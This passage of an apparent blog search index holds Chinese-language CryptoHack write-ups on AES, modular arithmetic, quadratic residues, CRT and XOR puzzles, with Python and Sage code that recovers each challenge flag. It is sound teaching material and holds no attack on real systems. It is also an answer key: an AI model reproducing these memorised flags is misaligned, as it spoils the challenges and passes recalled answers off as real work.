s[i][1] ^= v s[i][2] ^= u s[i][3] ^= v mix_columns(s)state = [ [108, 106, 71, 86], [96, 62, 38, 72], [42, 184, 92, 209], [94, 79, 8, 54],]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))inv_mix_columns(state)inv_shift_rows(state)print(matrix2bytes(state))# b&#x27;crypto&#123;d1ffUs3R&#125;&#x27; 题解题解题解题解题解题解","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/en/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/en/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"}]},{"title":"Cyptohack Modular_Arithmetic Writeup","slug":"CTF/Crypto/Cyptohack-Modular-Arithmetic-Writeup","date":"2025-06-02T09:53:03.000Z","updated":"2025-06-02T18:51:18.225Z","comments":true,"path":"2025/06/02/CTF/Crypto/Cyptohack-Modular-Arithmetic-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/02/CTF/Crypto/Cyptohack-Modular-Arithmetic-Writeup/","excerpt":"","text":"Greatest Common Divisor题 解直接实现一下欧几里得算法（辗转相除法）： 12345678910def gcd(x,y): if x == y: return x if x&lt;y: return gcd(x,y-x) else: return gcd(y,x-y) print(gcd(66528,52920))# 1512 也可以更精简一点： 1234def gcd(x, y): if y == 0: return x return gcd(y, x % y) Extended GCD题 解实现一下欧几里得拓展算法就好了： 123456789101112def extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x, y = y1, x1 - (a // b) * y1 return (x, y) print(extended_gcd(26513,32321))# (10245, -8404)print(min(extended_gcd(26513,32321)))# -8404 Modular Arithmetic 1题 解1234x = 11 % 6y = 8146798528947 % 17print(min(x,y))# 4 Modular Arithmetic 2题 解12print(pow(273246787654,65536,65537))# 1 也可以直接用费马小定理口算出结果1（因为65537是个质数）。 Modular Inverting题 解12print(pow(3,-1,13))# 9 Quadratic Residues题 解123456789p=29ints=[14,6,11]for i in ints: for k in range(p): if pow(k,2,p) == i: print(min(k,(-k)%p)) break# 8 Legendre Symbol题 output.txt： 123p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565] 解它这里的Legendre Symbol其实用的是Euler’s criterion的结论来定义的。 假设 a^2 \\equiv x \\text{ mod } p注意到 a \\equiv x^{\\frac{p+1}{4}} \\text{ mod } p因为根据费马小定理有: a^2 \\equiv x^{\\frac{p+1}{2}} = x^{\\frac{p-1}{2}} \\cdot x \\equiv x \\text{ mod } p并且因为$p \\equiv 3 \\text{ mod } 4$，$\\frac{p+1}{4} \\in \\mathbb{Z}$ 是个整数。所以可以直接计算$a$。 代码： 12345678910111213141516p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139assert p%4==3ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565]for i in ints: if pow(i,(p-1)//2,p) == 1: x = i a = pow(x,(p+1)//4,p)assert pow(a,2,p) == xprint(a)# 93291799125366706806545638475797430512104976066103610269938025709952247020061090804870186195285998727680200979853848718589126765742550855954805290253592144209552123062161458584575060939481368210688629862036958857604707468372384278049741369153506182660264876115428251983455344219194133033177700490981696141526 Modular Square Root题 output.txt: 123a = 8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161 解Sage里已经内置了这个算法。 12345678910111213141516171819from sage.all import *a = 8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161# 在 Sage 中构造有限域 GF(p)，并把 a 当作该域的一个元素：F = GF(p)x = F(a)# 直接调用 .sqrt() 方法，Sage 会返回一个平方根。如果 a 不是平方剩余，.sqrt() 会报错r = x.sqrt()r_int = Integer(r) other_root = p - r_intsmaller = min(r_int, other_root)print(smaller)# 2362339307683048638327773298580489298932137505520500388338271052053734747862351779647314176817953359071871560041125289919247146074907151612762640868199621186559522068338032600991311882224016021222672243139362180461232646732465848840425458257930887856583379600967761738596782877851318489355679822813155123045705285112099448146426755110160002515592418850432103641815811071548456284263507805589445073657565381850521367969675699760755310784623577076440037747681760302434924932113640061738777601194622244192758024180853916244427254065441962557282572849162772740798989647948645207349737457445440405057156897508368531939120 Chinese Remainder Theorem题 解可以使用 sympy 库的 crt 函数： 12345678910from sympy.ntheory.modular import crt# 定义模数和余数moduli = [5, 11, 17]remainders = [2, 3, 5]x, mod = crt(moduli, remainders)print(f&quot;x ≡ &#123;x&#125; mod &#123;mod&#125;&quot;)# x ≡ 872 mod 935 Adrien’s Signs题 123456789101112131415161718192021222324from random import randinta = 288260533169915p = 1007621497415251FLAG = b&#x27;crypto&#123;????????????????????&#125;&#x27;def encrypt_flag(flag): ciphertext = [] plaintext = &#x27;&#x27;.join([bin(i)[2:].zfill(8) for i in flag]) #把每个字节转成 8 位二进制形式的字符串,最后 plaintext 是整个明文按二进制展开的长字符串。 for b in plaintext: e = randint(1, p) n = pow(a, e, p) if b == &#x27;1&#x27;: ciphertext.append(n) else: #b=0 n = -n % p ciphertext.append(n) return ciphertextprint(encrypt_flag(FLAG)) 1[67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547] 解首先分析一下加密过程： 如果明文的第$i$位（记作$b$）等于0，则密文的第$i$位等于$a^e \\text{ mod }p$； 如果明文的第$i$位（记作$b$）等于1，则密文的第$i$位等于$-a^e \\text{ mod }p$； 每一轮的e都是随机的。 我们现在记每一轮的密文为$c$，有 c \\equiv a^e \\cdot (-1)^b \\text{ mod } p注意到 a^{\\frac{p-1}{2}} \\equiv 1 \\text{ mod }p (-1)^{\\frac{p-1}{2}} \\equiv -1 \\text{ mod }p也就是说 (\\frac{a}{p}) = 1 (\\frac{-1}{p}) = -1即$a$是二次剩余（quadratic residue）（所以$a^e$同样也是），而$-1$不是。所以c是否是二次剩余取决于b的值，即 (\\frac{c}{p}) = 1 \\Longleftrightarrow b=0 (\\frac{c}{p}) = -1 \\Longleftrightarrow b=1也就是说我们可以通过计算每一项密文的Legendre Symbol的值来还原b的值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283a = 288260533169915p = 1007621497415251assert pow(a,(p-1)//2,p) == 1assert pow(-1,(p-1)//2,p) == p-1ciphertext_list = [ 67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547]flag_bits = []power = (p-1)//2# 还原bits格式下的flagfor c in ciphertext_list: ls = pow(c, power, p) if ls == 1: flag_bits.append(&#x27;1&#x27;) else: flag_bits.append(&#x27;0&#x27;) # 还原bytes格式下的flagflag_bytes = bytearray()for i in range(0, len(flag_bits), 8): byte_str = &#x27;&#x27;.join(flag_bits[i:i+8]) flag_bytes.append(int(byte_str, 2))print(flag_bytes.decode())# crypto&#123;p4tterns_1n_re5idu3s&#125; Modular Binomials题 123456N = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519 解我们一开始会得到这几个等式： \\begin{align*} N &= p \\cdot q \\\\ c_1 &\\equiv (2 \\cdot p + 3 \\cdot q)^{e_1} \\mod N \\\\ c_2 &\\equiv (5 \\cdot p + 7 \\cdot q)^{e_2} \\mod N \\end{align*}通过观察可以发现 \\begin{align*} \\frac{c_2^{e_1}}{c_1^{e_2}} &\\equiv (\\frac{7}{3})^{e_1e_2} \\mod p \\\\ \\frac{c_2^{e_1}}{c_1^{e_2}} &\\equiv (\\frac{5}{2})^{e_1e_2} \\mod q \\\\ \\end{align*}我们现在设 \\begin{align*} A &:= \\frac{c_2^{e_1}}{c_1^{e_2}} \\mod N \\\\ B &:= (\\frac{7}{3})^{e_1e_2} \\mod N \\\\ \\end{align*}（注意，因为N只有2个质因数，且都不等于3，所以3在$\\mathbb{Z}/N\\mathbb{Z}$里是（乘法）可逆的。） 则有 A \\equiv (\\frac{7}{3})^{e_1e_2} \\equiv B \\mod p\\\\ A \\equiv (\\frac{5}{2})^{e_1e_2} \\not\\equiv B \\mod q\\\\也就是说$p \\mid (A-B) $ 但 $q \\nmid (A-B)$。所以便可以由此轻松计算出p： p = \\text{gcd}(A-B,N)再计算$q = N/p$。 代码： 1234567891011121314151617181920212223242526272829303132333435import mathN = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519# 计算 c2^e1 mod N 和 c1^e2 mod N c2_e1 = pow(c2, e1, N)c1_e2 = pow(c1, e2, N)inv_c1e2 = pow(c1_e2, -1, N) # 计算 A = c2^e1 * (c1^e2)^&#123;-1&#125; mod N A = (c2_e1 * inv_c1e2) % N# 计算 (7/3) mod Ninv3 = pow(3, -1, N)ratio73 = (7 * inv3) % N# 构造 B = (7/3)^(e1*e2) mod NB = pow(ratio73, e1 * e2, N)#取 gcd(A - B, N) 得到 p p = math.gcd(A - B, N)# 由 p 得到 q q = N // passert p * q == Nprint(f&quot;crypto&#123;&#123;&#123;p&#125;,&#123;q&#125;&#125;&#125;&quot;)# crypto&#123;112274000169258486390262064441991200608556376127408952701514962644340921899196091557519382763356534106376906489445103255177593594898966250176773605432765983897105047795619470659157057093771407309168345670541418772427807148039207489900810013783673957984006269120652134007689272484517805398390277308001719431273,132760587806365301971479157072031448380135765794466787456948786731168095877956875295282661565488242190731593282663694728914945967253173047324353981530949360031535707374701705328450856944598803228299967009004598984671293494375599408764139743217465012770376728876547958852025425539298410751132782632817947101601&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/en/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/en/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"}]},{"title":"Cyptohack Introduction_to_CryptoHack Writeup","slug":"CTF/Crypto/Cyptohack-Introduction_to_CryptoHack-Writeup","date":"2025-05-31T19:23:21.000Z","updated":"2025-06-01T16:32:32.503Z","comments":true,"path":"2025/05/31/CTF/Crypto/Cyptohack-Introduction_to_CryptoHack-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/05/31/CTF/Crypto/Cyptohack-Introduction_to_CryptoHack-Writeup/","excerpt":"","text":"ASCII题目 解用Python自带的chr()函数即可： 123456789str_list = [99, 114, 121, 112, 116, 111, 123, 65, 83, 67, 73, 73, 95, 112, 114, 49, 110, 116, 52, 98, 108, 51, 125]flag = &quot;&quot;for i in str_list: flag+= chr(i) print(flag)# crypto&#123;ASCII_pr1nt4bl3&#125; Hex题目 解用Python自带的bytes.fromhex()函数即可： 1234hex_str = &quot;63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d&quot;print(bytes.fromhex(hex_str).decode())# crypto&#123;You_will_be_working_with_hex_strings_a_lot&#125; Base64题目 解需要用到base64这个库的base64.b64encode()函数： 123456789import base64hex_content = &quot;72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf&quot;b_c = bytes.fromhex(hex_content)print(base64.b64encode(b_c).decode())# crypto/Base+64+Encoding+is+Web+Safe/ Bytes and Big Integers题目 解需要用到PyCryptodome库的Crypto.Util.number的long_to_bytes()函数： 123456from Crypto.Util.number import *m = 11515195063862318899931685488813747395775516287289682636499965282714637259206269print(long_to_bytes(m))# b&#x27;crypto&#123;3nc0d1n6_4ll_7h3_w4y_d0wn&#125;&#x27; XOR Starter题目 解12345678s = &quot;label&quot;new_s = &quot;&quot;for i in s: new_s += chr((ord(i) ^ 13)) print(f&quot;crypto&#123;&#123;&#123;new_s&#125;&#125;&#125;&quot;)# crypto&#123;aloha&#125; 或者用pwntolls库的xor()函数： 123456789from pwn import *s = &quot;label&quot;new_s = xor(s,13).decode()print(f&quot;crypto&#123;&#123;&#123;new_s&#125;&#125;&#125;&quot;)# BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes# strs = [packing.flat(s, word_size = 8, sign = False, endianness = &#x27;little&#x27;) for s in args]# crypto&#123;aloha&#125; XOR Properties题目 解12345678910from pwn import *k1 = bytes.fromhex(&quot;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313&quot;)k12 = bytes.fromhex(&quot;37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e&quot;)k23 = bytes.fromhex(&quot;c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1&quot;)f123 = bytes.fromhex(&quot;04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf&quot;)flag = xor( xor(f123,k23) , k1)print(flag)# b&#x27;crypto&#123;x0r_i5_ass0c1at1v3&#125;&#x27; Favourite byte题目 解1234567891011c = bytes.fromhex(&quot;73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d&quot;)m =b&quot;&quot;for key in range(256): m = bytes([b ^ key for b in c]) if b&quot;crypto&quot; in m: print(key) print(m) break# 16# b&#x27;crypto&#123;0x10_15_my_f4v0ur173_by7e&#125;&#x27; You either know, XOR you don’t题目 解通过已知的flag格式开头可以确定前几位密钥（myXORke），再根据flag格式结尾（&#125;）确定密钥的最后一位（y）。 1234567891011121314151617from pwn import *c = bytes.fromhex(&quot;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104&quot;)known_flag = b&quot;crypto&#123;&quot;known_key_begin = xor( c[0:len(known_flag)] , known_flag ) # print(known_key_begin) # b&#x27;myXORke&#x27;known_key_end = xor( c[-1] , b&quot;&#125;&quot; ) # print(known_key_end) # b&#x27;y&#x27;key = b&#x27;myXORkey&#x27;flag = xor(c,key)print(flag)# b&#x27;crypto&#123;1f_y0u_Kn0w_En0uGH_y0u_Kn0w_1t_4ll&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/en/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/en/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"}]},{"title":"HTB Unholy_Union 